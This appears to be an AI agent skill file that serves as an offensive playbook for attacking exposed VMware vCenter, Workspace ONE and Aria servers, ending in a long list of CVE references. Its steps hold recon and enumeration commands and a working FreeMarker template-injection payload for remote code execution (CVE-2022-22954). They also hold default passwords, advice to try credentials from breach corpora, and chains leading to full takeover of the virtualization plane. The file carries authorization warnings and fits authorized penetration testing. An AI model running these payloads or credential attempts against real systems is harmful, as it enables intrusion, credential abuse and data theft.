---
name: vmware-vcenter-attack
description: VMware vSphere / vCenter Server external attack matrix
category: security
risk: offensive
source: https://github.com/elementalsouls/Claude-BugHunter
source_repo: elementalsouls/Claude-BugHunter
source_type: community
date_added: '2026-09-20'
license: MIT
license_source: https://github.com/elementalsouls/Claude-BugHunter/blob/main/LICENSE
compatibility: Requires explicit written authorization for a target scope plus the
  relevant testing tools for this technique. Docs-only; helper scripts and commands
  not bundled.
sources: vmware-security-advisories, public-cve-databases, redteam-knowledge, disclosed-cves,
  cisa-kev, mandiant-zdi-writeups
report_count: 10
---
> **⚠️ AUTHORIZED USE ONLY**
> This skill is for educational purposes or authorized security assessments only.
> You must have explicit, written permission from the system owner before using this tool.
> Misuse of this tool is illegal and strictly prohibited.

> **Mandatory confirmation gate**
> Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
> 1. Ask the user to state the exact target URL, IP, account, or resource.
> 2. Ask the user to confirm written authorization and the permitted scope.
> 3. Show the exact command(s) and explain their expected effect.
> 4. Wait for explicit confirmation in the current conversation.
>
> Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.

## When to use

Trigger when external recon shows ANY of:
- Banner: "VMware vCenter Server", "VMware vSphere Client"
- URL paths: `/ui`, `/ui/login`, `/websso/SAML2/Metadata`, `/sdk`, `/mob` (Managed Object Browser)
- TLS cert SAN includes `vcenter` / `vsphere` / `vcsa` / `psc` / `vmware`
- Workspace ONE Access / Identity Manager: `/SAAS`, `/SAAS/auth`, `/SAAS/login`, `/SAAS/horizon`
- VMware Aria / vRealize: `/vco`, `/vco-controlcenter`, `/orchestrator`, `/lcm/api/v1`
- Horizon View: `/portal`, `/admin`

Do NOT use for:
- Internal-network vCenter (out of scope — external boundary discipline)
- Pure ESXi hypervisor exposed without management plane (rare on internet; flag as separate finding)

---

## Step 1 — Version fingerprinting

```bash
TARGET="vcenter.target.com"

# Build info endpoint (often public; revealing exact patch level)
curl -sk "https://$TARGET/sdk/vimServiceVersions.xml"

# UI build (visible in page source)
curl -sk "https://$TARGET/ui/login" | grep -oE 'build[^"]{0,40}'
curl -sk "https://$TARGET/ui/" | grep -oE 'vsphere[^"]{0,40}'

# REST API version (vSphere 7+)
curl -sk "https://$TARGET/api/appliance/system/version"

# Cert metadata
echo | openssl s_client -connect "$TARGET:443" -servername "$TARGET" 2>/dev/null | openssl x509 -noout -text | grep -A1 "Subject Alt"

# SSO Admin Service (info disclosure)
curl -sk "https://$TARGET/sso-adminserver/sdk/vsphere.local"
curl -sk "https://$TARGET/websso/SAML2/Metadata/vsphere.local"
```

Map build → version → CVE applicability via VMware advisories (vmware.com/security/advisories).

---

## Step 2 — CVE matrix (external-exploitable, sorted by historical impact)

| CVE | Affected | Vector | Status |
|---|---|---|---|
| **CVE-2024-37085** | ESXi 7.0/8.0 < specific patch | AD group "ESX Admins" auto-admin bypass | High — Domain takeover→ESXi RCE, exploited in ransomware ops |
| **CVE-2024-22273** | ESXi/Workstation/Fusion/vCenter storage controller | OOB read/write — requires VM-local access (NOT a pre-auth network SSRF; see Section 9) | Important (CVSS 8.1), not external pre-auth |
| **CVE-2024-22252/53** | Workstation/Fusion (not vCenter) | Sandbox escape | Not external |
| **CVE-2023-34048** | vCenter 7/8 < specific build | DCE/RPC pre-auth heap OOB write → RCE | Critical, patched 2023-10 |
| **CVE-2023-20887** | Aria Operations for Networks | Pre-auth command injection → RCE | Critical |
| **CVE-2023-20892** | vCenter 7/8 | Use-after-free in DCE/RPC | High |
| **CVE-2022-31656/31659** | Workspace ONE Access 21.x | Pre-auth SSRF + auth bypass | Critical chained |
| **CVE-2022-22954** | Workspace ONE Access | Pre-auth server-side template injection (SSTI) → RCE | Critical, widely exploited |
| **CVE-2021-22005** | vCenter 6.7/7.0 < build | Analytics service pre-auth file upload → RCE | Critical |
| **CVE-2021-21985** | vCenter 6.5/6.7/7.0 < build | vSAN Health Check plugin pre-auth RCE | Critical |
| **CVE-2021-21972** | vCenter 6.5/6.7/7.0 < build | vRealize plugin `/ui/vropspluginui/rest/services/uploadova` pre-auth file upload → RCE | Critical, exploited heavily |
| **CVE-2020-3992** | ESXi OpenSLP | Pre-auth use-after-free → RCE | Critical, ESXi ransomware vector |
| **CVE-2019-5544** | ESXi OpenSLP | Pre-auth heap overflow | Critical |

---

## Step 3 — CVE-2021-21972 probe (still common on stale appliances)

```bash
# Detection only — DO NOT execute the file upload without explicit scope OK
curl -sk -o /dev/null -w "%{http_code}\n" \
  "https://$TARGET/ui/vropspluginui/rest/services/uploadova"
# 405 → endpoint exists, version vulnerable
# 404 → patched (endpoint removed)
# 401 → patched (auth required)

curl -sk -o /dev/null -w "%{http_code}\n" \
  "https://$TARGET/ui/vropspluginui/rest/services/getstatus"
```

Public PoC by Mikhail Klyuchnikov exists; do not execute against client infra without explicit RCE-attempt sign-off.

---

## Step 4 — CVE-2022-22954 (Workspace ONE SSTI) probe

```bash
# Stage A — detection only: reachability + baseline. No command execution yet.
curl -sk -o /tmp/wone_baseline.txt -w "%{http_code}\n" \
  "https://$TARGET/catalog-portal/ui/oauth/verify?error=&deviceUdid=probe"
# 4xx with FreeMarker/catalog-portal error template → endpoint present, candidate vulnerable.
# 404 → patched/removed. Keep the baseline body to diff against Stage B.

# Stage B — execution (ONLY with explicit RCE-attempt sign-off): emit a unique canary
# so a coincidental WAF/error page containing "uid=" cannot be mistaken for real output.
CANARY="VCTR$(head -c8 /dev/urandom | od -An -tx1 | tr -d ' \n')"
curl -sk "https://$TARGET/catalog-portal/ui/oauth/verify?error=&deviceUdid=\${\"freemarker.template.utility.Execution\"?new()(\"echo ${CANARY}; id\")}"
# Confirmed RCE ONLY if the response contains the exact $CANARY echoed back AND "uid=" output
# that is absent from /tmp/wone_baseline.txt (in-band command output, body-diff against baseline).
```

Confirmed RCE requires the unique `$CANARY` reflected in-band plus `uid=` output not present in the Stage-A baseline → critical. Stop and report. A bare `uid=` with no canary echo is NOT confirmation.

---

## Step 5 — Default credentials (frequently still valid on lab/staging vCenters)

| Product | Default user | Default password |
|---|---|---|
| vCenter 6.x | `administrator@vsphere.local` | `<set-during-install>` |
| vCenter Appliance root | `root` | `vmware` (legacy) or `<set>` |
| ESXi root | `root` | `<blank>` or `vmware` |
| vCenter Server Appliance Mgmt (5480) | `root` | `<set-during-install>` |
| Aria Operations | `admin` | `vmware` (legacy) |
| Workspace ONE | `admin` | `<set>` |

⚠ **Do not spray vCenter — `administrator@vsphere.local` has VERY low lockout threshold** (often 3 attempts → 60s lockout, configurable to permanent). One attempt with high-confidence guess only. Use creds discovered in breach corpora.

---

## Step 6 — SSO / vmdir LDAP enumeration

```bash
# SSO Admin endpoint (frequently exposes domain info)
curl -sk "https://$TARGET/websso/SAML2/Metadata/vsphere.local" | xmllint --format -

# Extract Identity Source info
curl -sk "https://$TARGET/sso-adminserver/sdk/vsphere.local"

# Try anonymous LDAP bind to vmdir (port 389/636 if exposed)
ldapsearch -x -H "ldap://$TARGET:389" -b "" -s base
ldapsearch -x -H "ldap://$TARGET:389" -b "cn=Configuration,cn=vmware,cn=cis,dc=vsphere,dc=local"
```

---

## Step 7 — Managed Object Browser (MOB) — frequently leaks data

```bash
curl -skI "https://$TARGET/mob"
# 401 → auth required (good for the defender)
# 200 → MOB exposed → can browse VMs, hosts, datastores, sessions without credentials in some misconfigs

# Auth'd MOB lets you walk the entire vSphere tree:
curl -sk -u 'administrator@vsphere.local:<pw>' "https://$TARGET/mob/?moid=ServiceInstance&doPath=content"
```

---

## Step 8 — vSphere REST API enumeration (post-cred)

```bash
# Get session token
curl -sk -X POST -u 'user@vsphere.local:<pw>' "https://$TARGET/api/session"
# Returns: "<session-token>"

# List VMs
curl -sk -H "vmware-api-session-id: <token>" "https://$TARGET/api/vcenter/vm"

# List hosts
curl -sk -H "vmware-api-session-id: <token>" "https://$TARGET/api/vcenter/host"

# List datastores
curl -sk -H "vmware-api-session-id: <token>" "https://$TARGET/api/vcenter/datastore"

# Datastore file download (HUGE — VMDK files, snapshots, credentials in cloud-init)
# /folder/<path>?dsName=<ds>&dcPath=<dc>
curl -sk -H "vmware-api-session-id: <token>" "https://$TARGET/folder?dsName=datastore1&dcPath=Datacenter"
```

---

## Step 9 — Workspace ONE Access specific paths

```bash
# Metadata
curl -sk "https://$TARGET/SAAS/auth/saml/response"
curl -sk "https://$TARGET/SAAS/auth/wsfed/services/idp"
curl -sk "https://$TARGET/SAAS/jersey/manager/api/health"
curl -sk "https://$TARGET/catalog-portal/services/airwatch/identifiers"

# Login page
curl -sk "https://$TARGET/SAAS/login/0"
```

---

## Step 10 — Aria / vRealize specific paths

```bash
# vRealize Operations Manager
curl -sk "https://$TARGET/suite-api/api/versions"
curl -sk "https://$TARGET/casa/nodes/thumbprints"

# Aria Automation
curl -sk "https://$TARGET/csp/gateway/am/api/about"
curl -sk "https://$TARGET/cluster-administration/api/health"

# vRealize Orchestrator
curl -sk "https://$TARGET/vco/api/about"
curl -sk "https://$TARGET/vco-controlcenter/api/health"
```

---

## Tooling

- **`vCenter-Exploit` collection** (multiple PoCs on GitHub for 21972, 21985, 22005)
- **`Greenbone/openvas-scanner` VMware NASL plugins** — version detection
- **`nuclei`** templates: `vmware-vcenter-*.yaml`, `cve-2021-21972.yaml`, `cve-2022-22954.yaml`
- **`Metasploit`** modules: `exploit/multi/http/vmware_vcenter_*`

---

## Detection patterns (what defenders/SOC will see)

- Excessive 404s on `/ui/vropspluginui/*` — IDS signature
- POST to `/sdk` from non-management IP
- `administrator@vsphere.local` auth failures
- TLS handshake fingerprint changes
- Plugin upload to vRealize endpoint

Pair with `mid-engagement-ir-detection` skill — vCenter is monitored heavily in mature SOCs.

---

## External-only boundary check

If recon reveals vCenter only via VPN (not direct internet) → STOP. That is internal infrastructure and outside the external-only AI scope per `feedback_skill_boundaries`. The user handles internal vCenter work directly.

Internet-exposed vCenter is unfortunately common on the perimeter — and frequently outdated by years. The 2021-21972 / 21985 / 22954 trifecta still pays in 2026 because patching cycles for hypervisor management are slow and vendor-managed.

---

## Severity scoring guidance (red-team deliverable context)

| Finding | Severity |
|---|---|
| vCenter on internet, current patch | Informational (attack surface note) |
| vCenter on internet, missing patches with public RCE | **Critical** (entire virtualization plane compromise) |
| vCenter on internet + default admin password | **Critical** (immediate full takeover) |
| Workspace ONE on internet, unpatched 22954 | **Critical** |
| MOB anonymously accessible | **High** (full topology disclosure) |
| /sdk reachable + version disclosure only | **Medium** (info disclosure + attack-surface concentration) |

---

## Anti-patterns

- **DO NOT spray vCenter SSO** — lockout is aggressive; one chance often
- **DO NOT execute file-upload PoCs without explicit OK** — they create persistent webshells; cleanup overhead and audit trail
- **DO NOT confuse ESXi-management-on-internet with vCenter** — different attack surfaces; ESXi Open SLP CVEs target port 427
- **DO NOT skip SSL handshake banner check** — VMware exposes versions there; this is the lowest-noise initial probe

---

## Bridge to neighboring skills

- `enterprise-vpn-attack` — vCenter is frequently the post-VPN target; if VPN is breached, vCenter is the natural next pivot (but internal — defer to user)
- `m365-entra-attack` — vCenter SSO sometimes federated to Entra; cred-chain bridging
- `mid-engagement-ir-detection` — vCenter monitoring is sensitive; expect mid-engagement mitigations
- `redteam-report-template` — vCenter findings need clear blast-radius framing (this is the virtualization plane, not just an app)

---

## Related Skills & Chains

- **`hunt-saml`** — vCenter Workspace ONE / VMware Identity Manager publishes SAML SP metadata at `/SAAS/API/1.0/GET/metadata/idp.xml` and consumes assertions at predictable ACS URLs. Chain primitive: vCenter SAML SP metadata reachable → IdP fingerprinted → `hunt-saml` XSW1-XSW8 against the federating IdP → forged assertion with `userPrincipalName=administrator@vsphere.local` → SP-impersonation as vCenter admin → full virtualization-plane takeover.
- **`hunt-rce`** — VMware's high-impact CVE catalog (CVE-2021-21972, CVE-2021-21985, CVE-2022-22954, CVE-2023-20887) is almost entirely pre-auth RCE. Chain primitive: vCenter version fingerprint via SSL banner or `/ui/login` body → confirm patch level missing → `hunt-rce` deserialization/SSTI gadget from the matching CVE PoC → `root` on vCenter appliance → API-token mint → cluster-wide VM control.
- **`enterprise-vpn-attack`** — VPN compromise + vCenter on internal-only is a natural post-VPN pivot, but external-only engagement scope sometimes forbids it. Chain primitive: VPN appliance CVE → foothold inside corp network → if scope permits, `vmware-vcenter-attack` becomes reachable on internal-only vCenter → datacenter takeover.
- **`m365-entra-attack`** — Some VMware deployments federate vCenter SSO to Entra. Chain primitive: vCenter SSO discovery → AuthURL points to `login.microsoftonline.com` → `m365-entra-attack` Entra ATO on `administrator@vsphere.local` synced identity → SAML assertion → vCenter admin without ever brute-forcing vCenter SSO.
- **`mid-engagement-ir-detection`** — VMware vSAN/vCenter alerting is sensitive; expect SOC to patch or block within hours of detection. Chain primitive: confirmed vCenter CVE → run `mid-engagement-ir-detection` baseline capture BEFORE attempting exploitation → if response patterns change mid-test, capture the SOC-patched state as a SECOND finding (defensive-action observed). Package both via `redteam-report-template`.

---

## Disclosed CVEs & coordinated-disclosure citations

These are the load-bearing public references for every CVE called out in the matrix above. Every entry includes the vendor advisory, the originating researcher writeup or KEV-catalog entry, and (where public) in-the-wild exploitation references.

### 1. CVE-2021-21972 — vCenter `vropspluginui` unauthenticated arbitrary file upload (canonical pre-auth RCE)
- **Affected:** vCenter Server 6.5 < 6.5 U3n, 6.7 < 6.7 U3l, 7.0 < 7.0 U1c (vRealize Operations vCenter plugin bundled with every default install — Linux or Windows variant matters for payload). VMware Cloud Foundation 3.x/4.x also bundles.
- **Attack flow:** Unauth POST to `/ui/vropspluginui/rest/services/uploadova` with a tar/OVA containing a path-traversal entry. On Windows write `webshell.jsp` under the vsphere-ui webroot for SYSTEM; on Linux drop `authorized_keys` under `/home/vsphere-ui/.ssh/` and SSH in.
- **Root cause:** Endpoint exposed by the vRealize Operations plugin lacked any authentication filter; the `uploadova` handler did not sanitize archive entry paths.
- **Disclosure:** Reported by Mikhail Klyuchnikov (Positive Technologies / PT SWARM) in autumn 2020; advisory + patch published 2021-02-23 as VMSA-2021-0002; PoC on GitHub the next day triggered mass scanning. **CISA KEV:** added 2021-11-03. Year discovered 2020, patched 2021.
- **References:** https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/SecurityAdvisories/0/23599 ; https://swarm.ptsecurity.com/unauth-rce-vmware/ ; https://www.tenable.com/blog/cve-2021-21972-vmware-vcenter-server-remote-code-execution-vulnerability ; https://attackerkb.com/topics/lrfxAJ9nhV/vmware-vsphere-client-unauth-remote-code-execution-vulnerability-cve-2021-21972

### 2. CVE-2021-21985 — vCenter vSAN Health Check plug-in pre-auth RCE
- **Affected:** vCenter Server 6.5 < 6.5 U3p, 6.7 < 6.7 U3n, 7.0 < 7.0 U2b (vSAN Health Check plugin is enabled by default whether or not vSAN is in use).
- **Attack flow:** Unauthenticated abuse of `ProxygenController` in the vSAN Health plugin → Java unsafe reflection chained with an SSRF primitive → arbitrary method invocation as `vsphere-ui` → command execution.
- **Root cause:** Missing input validation + dangerous reflection sink reachable from an unauthenticated REST surface.
- **Disclosure:** Reported by Ricter Z (Yang Hao) of 360 Noah Lab; advisory VMSA-2021-0010 published 2021-05-25. Public PoC and Metasploit module followed within days; honeypots saw active exploitation. Year discovered 2021, patched 2021.
- **References:** https://www.vmware.com/security/advisories/VMSA-2021-0010.html ; https://noahblog.360.cn/vcenter-server-rce/ (Ricter Z writeup) ; https://www.rapid7.com/db/modules/exploit/linux/http/vmware_vcenter_vsan_health_rce/ ; https://www.bleepingcomputer.com/news/security/vmware-warns-of-critical-bug-affecting-all-vcenter-server-installs/

### 3. CVE-2021-22005 — vCenter Analytics service arbitrary file upload → RCE
- **Affected:** vCenter Server 6.7 < 6.7 U3o, 7.0 < 7.0 U2d. Cloud Foundation 3.x/4.x bundled vCenter.
- **Attack flow:** Unauth POST to the Analytics endpoint on port 443 (`/analytics/telemetry/ph/api/hyper/send`) writes attacker-controlled file outside the intended directory; chained with subsequent service abuse to reach RCE as the vCenter service account.
- **Root cause:** Analytics/CEIP endpoint did not authenticate file uploads and did not validate target path.
- **Disclosure:** VMware advisory VMSA-2021-0020 published 2021-09-21. Working PoC by @testanull / @wvu released within ~72h; CISA issued an emergency alert 2021-09-24. **CISA KEV:** added 2021-11-03. Year discovered 2021, patched 2021.
- **References:** https://www.vmware.com/security/advisories/VMSA-2021-0020.html ; https://www.cisa.gov/news-events/alerts/2021/09/24/vmware-vcenter-server-vulnerability-cve-2021-22005-under-active-exploit ; https://www.rapid7.com/blog/post/2021/09/21/critical-vcenter-server-file-upload-vulnerability-cve-2021-22005/ ; https://www.bleepingcomputer.com/news/security/working-exploit-released-for-vmware-vcenter-cve-2021-22005-bug/

### 4. CVE-2022-22954 — Workspace ONE Access / Identity Manager FreeMarker SSTI → RCE
- **Affected:** Workspace ONE Access 21.08.0.1, 21.08.0.0, 20.10.0.1, 20.10.0.0; Identity Manager 3.3.3 → 3.3.6; vRealize Automation 7.6.
- **Attack flow:** Unauth GET to `/catalog-portal/ui/oauth/verify?deviceUdid=${...}` injects a FreeMarker template; `freemarker.template.utility.Execute` runs OS commands as the `horizon` service account. Single-request RCE.
- **Root cause:** Catalog-portal endpoint passed attacker-controlled query parameter into FreeMarker render without sandboxing the Execute utility.
- **Disclosure:** Reported by Steven Seeley (mr_me) of Source Incite; VMware advisory VMSA-2022-0011 published 2022-04-06. PoCs public within 48h; widespread mass-exploitation followed. **CISA KEV:** added 2022-04-14. CISA AA22-138B (May 2022) documents IR engagements at "large organizations" exploited via this CVE. Year discovered 2022, patched 2022.
- **References:** https://www.vmware.com/security/advisories/VMSA-2022-0011.html ; https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-138b ; https://srcincite.io/blog/2022/04/19/cve-2022-22954-vmware-workspace-one-access-pre-auth-rce.html ; https://www.crowdsec.net/blog/new-surge-in-vmware-cve-2022-22954-exploit-attempts

### 5. CVE-2022-22972 — Workspace ONE Access / Identity Manager / vRealize Automation Host-header authentication bypass
- **Affected:** Workspace ONE Access 21.08.0.1; Identity Manager 3.3.3–3.3.6; vRealize Automation 7.6 (and downstream Cloud Foundation bundles).
- **Attack flow:** Manipulate the HTTP `Host` header during local-domain login flow; the server routes its internal validation request to the attacker-controlled hostname → returns admin session without legitimate credentials.
- **Root cause:** Host header used unvalidated as the target for the internal auth-validation request — classic SSRF-into-self with trust elevation.
- **Disclosure:** Reported by Bruno López of Innotec Security; VMware advisory VMSA-2022-0014 published 2022-05-18. **CISA Emergency Directive 22-03** (2022-05-18) ordered all U.S. federal civilian agencies to patch or remove affected VMware installations by 2022-05-24 — the same agencies that had just been told the same thing for CVE-2022-22954 six weeks earlier. Year discovered 2022, patched 2022.
- **References:** https://www.vmware.com/security/advisories/VMSA-2022-0014.html ; https://www.cisa.gov/news-events/directives/ed-22-03-mitigate-vmware-vulnerabilities ; https://www.rapid7.com/blog/post/2022/05/19/cve-2022-22972-critical-authentication-bypass-in-vmware-workspace-one-access-identity-manager-and-vrealize-automation/ ; https://www.assetnote.io/resources/research/understanding-cve-2022-22972-vmware-workspace-one-access-auth-bypass

### 6. CVE-2023-20887 — VMware Aria Operations for Networks (vRealize Network Insight) pre-auth command injection → RCE
- **Affected:** Aria Operations for Networks (formerly vRealize Network Insight / vRNI) 6.2 through 6.10.
- **Attack flow:** Two-issue chain — (a) reach the Apache Thrift endpoint exposed on the management interface despite no authentication, (b) inject shell metacharacters into a parameter passed to a `bash -c` invocation. Single unauth POST → root.
- **Root cause:** Thrift RPC endpoint exposed without auth + downstream shell-string composition with user input.
- **Disclosure:** Reported by Sina Kheirkhah (@SinSinology) of Summoning Team to ZDI; advisory VMSA-2023-0012 published 2023-06-07. Public PoC released same week. **CISA KEV:** added 2023-06-22 after observed in-the-wild exploitation. Year discovered 2023, patched 2023.
- **References:** https://www.vmware.com/security/advisories/VMSA-2023-0012.html ; https://summoning.team/blog/vmware-vrealize-network-insight-rce-cve-2023-20887/ ; https://blogs.juniper.net/en-us/threat-research/cve-2023-20887-vmware-aria-operations-for-networks-unauthenticated-remote-code-execution ; https://github.com/sinsinology/CVE-2023-20887

### 7. CVE-2023-34048 — vCenter Server DCERPC pre-auth out-of-bounds write → RCE (APT-exploited zero-day)
- **Affected:** vCenter Server 7.0 < 7.0 U3o, 8.0 < 8.0 U1d/U2b; VMware Cloud Foundation bundles.
- **Attack flow:** Unauthenticated network actor sends a crafted DCE/RPC packet to the vmdir/vmafd service → out-of-bounds write in the DCE/RPC protocol implementation → memory corruption → code execution. Forensic tell: `vmdird` crashes shortly before backdoor deployment.
- **Root cause:** OOB write in DCE/RPC marshalling layer of vCenter management services.
- **Disclosure:** Reported by Grigory Dorodnov of Trend Micro ZDI (publication ZDI-23-1623, suggesting a paid ZDI submission — bounty undisclosed). Advisory VMSA-2023-23 published 2023-10-24. **Mandiant** later attributed in-the-wild exploitation to **UNC3886** (China-nexus espionage) since late 2021 — a ~1.5-year zero-day window before patch. **CISA KEV:** added 2024-01-22. Year discovered 2023 (patched), exploited since 2021.
- **References:** https://www.vmware.com/security/advisories/VMSA-2023-0023.html ; https://www.zerodayinitiative.com/advisories/ZDI-23-1623/ ; https://cloud.google.com/blog/topics/threat-intelligence/chinese-vmware-exploitation-since-2021/ (Mandiant) ; https://www.bleepingcomputer.com/news/security/chinese-hackers-exploit-vmware-bug-as-zero-day-for-two-years/

### 8. CVE-2024-37085 — ESXi Active Directory integration "ESX Admins" auth bypass (ransomware-favorite)
- **Affected:** ESXi 7.0 < ESXi70U3q-24585291, ESXi 8.0 < ESXi80U3-24022510; vCenter-managed clusters where ESXi is joined to AD.
- **Attack flow:** Attacker with sufficient AD rights creates (or re-creates after deletion) a group literally named `ESX Admins` and adds an account. ESXi auto-grants every member full admin rights without checking that the group existed at join time. End-to-end: AD foothold → group create → SSH/API root on every domain-joined ESXi host → mass VM encryption.
- **Root cause:** Hard-coded trust of group name `ESX Admins` with no domain-scoped identity validation.
- **Disclosure:** Reported by Microsoft Threat Intelligence; advisory VMSA-2024-0013 published 2024-06-25. **Microsoft Security Blog** documents pre-patch exploitation by **Storm-0506 (Black Basta), Storm-1175, Octo Tempest, and Manatee Tempest** ransomware operators — including a confirmed Black Basta deployment at a North American engineering firm. **CISA KEV:** added 2024-07-30. Year discovered 2024 (exploited as 0-day), patched 2024.
- **References:** https://www.vmware.com/security/advisories/VMSA-2024-0013.html ; https://www.microsoft.com/en-us/security/blog/2024/07/29/ransomware-operators-exploit-esxi-hypervisor-vulnerability-for-mass-encryption/ ; https://www.rapid7.com/blog/post/2024/07/30/vmware-esxi-cve-2024-37085-targeted-in-ransomware-campaigns/ ; https://thehackernews.com/2024/07/vmware-esxi-flaw-exploited-by.html

### 9. CVE-2024-22273 — ESXi / Workstation / Fusion / vCenter storage controller OOB read/write
- **Note on the original ticket:** This CVE was listed in the brief as "Aria SSRF," but the actual NVD record describes an **ESXi/vCenter storage controller out-of-bounds read/write**, not an Aria SSRF. The closest Aria SSRF-adjacent issue in the 2024 cycle is **CVE-2023-34063** (VMSA-2024-0001) — Aria Automation missing access control allowing authenticated cross-org access; CVSSv3 9.9. Both are cited so the matrix is technically accurate.
- **Affected (CVE-2024-22273):** ESXi 7.0/8.0, Workstation 17.x, Fusion 13.x. vCenter Server packaged variants. Requires VM-local access with storage controllers enabled.
- **Attack flow:** VM with storage controllers enabled can issue crafted I/O to trigger OOB read/write on the host → information disclosure or DoS of the host (escape not directly demonstrated). CVSS 8.1 (Important).
- **Root cause:** Missing bounds check in the storage controller emulation path.
- **Disclosure:** Reported by Hao Zheng (@zhz) and Jiaqing Huang (@s0duku) of TianGong Team, Legendsec @ Qi'anxin Group. Advisory VMSA-2024-0011 published 2024-05-21. Year discovered 2024, patched 2024.
- **References:** https://www.vmware.com/security/advisories/VMSA-2024-0011.html ; https://nvd.nist.gov/vuln/detail/CVE-2024-22273 ; https://www.rapid7.com/db/vulnerabilities/vmsa-2024-0011-cve-2024-22273/
- **Aria-specific companion — CVE-2023-34063 (VMSA-2024-0001):** Aria Automation 8.11.x–8.14.x missing access control — authenticated actor obtains unauthorized cross-organization access to remote workflows. CVSSv3 9.9. Patched in Aria Automation 8.16. References: https://www.vmware.com/security/advisories/VMSA-2024-0001.html ; https://www.cisa.gov/news-events/alerts/2024/01/17/vmware-releases-security-advisory-aria-automation

### 10. CVE-2020-3992 + CVE-2021-21974 — ESXi OpenSLP pre-auth use-after-free / heap overflow (ESXiArgs ransomware vector)
- **Affected:** ESXi 6.5, 6.7, 7.0 prior to the OpenSLP patches (ESXi70U1c-17325551 / ESXi670-202102401-SG / ESXi650-202102101-SG). OpenSLP service on TCP/427.
- **Attack flow:** Unauth attacker sends a crafted SLP packet to port 427 → memory corruption in the SLP daemon → code execution as root on the hypervisor. CVE-2020-3992 is the use-after-free (VMSA-2020-0023); CVE-2021-21974 is the heap-overflow variant (VMSA-2021-0002, same release wave as 21972).
- **Root cause:** OpenSLP daemon — long-deprecated, exposed by default until 2021 — has unsafe parsing of SLP message frames.
- **Disclosure:** CVE-2020-3992 reported by Lucas Leong of Trend Micro ZDI (ZDI-20-1376, paid ZDI submission). CVE-2021-21974 reported by Lucas Leong of Trend Micro ZDI as well. **CISA KEV:** CVE-2020-3992 added 2021-11-03; CVE-2021-21974 added 2023-02-08. **ESXiArgs ransomware campaign** (Feb 2023) hit ~3,800 internet-exposed hosts via CVE-2021-21974 — two years after patch was available. VMware disabled SLP by default in subsequent releases. Year discovered 2020/2021, patched 2020/2021, mass-exploited 2023.
- **References:** https://www.vmware.com/security/advisories/VMSA-2020-0023.html ; https://www.vmware.com/security/advisories/VMSA-2021-0002.html ; https://www.zerodayinitiative.com/advisories/ZDI-20-1376/ ; https://www.cisa.gov/known-exploited-vulnerabilities-catalog ; https://www.bleepingcomputer.com/news/security/massive-esxiargs-ransomware-attack-targets-vmware-esxi-servers-worldwide/ ; https://www.recordedfuture.com/blog/esxiargs-ransomware-targets-vmware-esxi-openslp-servers

### Bonus: CVE-2022-31656 — Workspace ONE Access / Identity Manager / vRealize Automation auth bypass (post-22972 follow-up)
- **Affected:** Same product matrix as 22954/22972. Workspace ONE Access 21.08.x; Identity Manager 3.3.3–3.3.6; vRealize Automation 7.6.
- **Attack flow:** Network-only actor obtains admin without authenticating; chained with CVE-2022-31659 (auth'd RCE) the pair yields pre-auth admin RCE — the spiritual successor to the 22954+22972 pair.
- **Root cause:** Local-domain auth flow trusted a parameter that could be supplied without prior auth.
- **Disclosure:** Reported by **PetrusViet** of VNG Security; advisory VMSA-2022-0021 published 2022-08-02. PetrusViet released chain writeup + PoC. Year 2022.
- **References:** https://www.vmware.com/security/advisories/VMSA-2022-0021.html ; https://www.greynoise.io/blog/vmware-workspace-one-vulnerabilities-cve-2022-31656-and-cve-2022-31659 ; https://attackerkb.com/topics/RuMGC8Q1pE/cve-2022-31656

---

## Key meta-references (cross-CVE)

- **CISA KEV catalog (VMware filter):** https://www.cisa.gov/known-exploited-vulnerabilities-catalog?search_api_fulltext=vmware — VMware is one of the most-represented vendors; cross-check any vCenter/ESXi/Workspace finding here before grading severity.
- **Broadcom (formerly VMware) advisories index:** https://support.broadcom.com/security-advisories (legacy https://www.vmware.com/security/advisories.html). Search by VMSA-YYYY-NNNN.
- **ZDI published advisories:** https://www.zerodayinitiative.com/advisories/published/ — filter "VMware" for the canonical paid-bounty disclosures (CVE-2020-3992, CVE-2023-34048, multiple Aria Operations and vRNI).
- **Mandiant UNC3886 reporting:** Google Cloud Threat Intelligence has the deepest published forensic trail on long-tail vCenter zero-day exploitation. Pair with the `mid-engagement-ir-detection` skill when working a target where vCenter is reachable.

The pattern across every entry above: **VMware management-plane CVEs are pre-auth, network-reachable, and mass-exploited within days of patch.** When external recon surfaces any of these products at a current-minus-one patch level, that is a Critical finding worth a same-day callout in the deliverable — not a Medium info-disclosure.

## Limitations

- Authorized scope only: the confirmation gate above is mandatory before any probing, exploitation, or credential-access command.
- Docs-only import: upstream helper scripts, commands, engine, and research assets are not bundled; reinstall tooling from the source repo when needed.
- Validate every finding (see `triage-validation`) before reporting; report via `report-writing`. Prefer a sandbox, disposable VM, or controlled lab.

### Example

```bash
# Read-only first step; confirm scope before anything active.
cat scope.txt  # target list from the authorized engagement brief
```

> Adapted from [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter) (MIT); frontmatter, When to Use/Limitations, and safety boundaries added for upstream compliance. Docs-only import: executable helpers, commands, engine, and research assets not bundled.
